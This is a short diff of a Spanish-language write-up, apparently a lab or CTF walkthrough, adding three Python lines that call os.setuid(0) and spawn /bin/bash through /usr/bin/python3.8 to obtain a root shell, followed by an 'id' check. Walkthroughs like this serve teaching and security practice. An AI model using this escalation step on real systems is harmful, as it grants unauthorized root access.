@@ -45,6 +45,9 @@ El reporte que nos da el script contiene datos interesantes la ruta /usr/bin/pyt
 si hacemos un 
 ```
 /usr/bin/python3.8
+import os
+os.setuid(0)
+os.system("/bin/bash")
 ```
 ```
 id
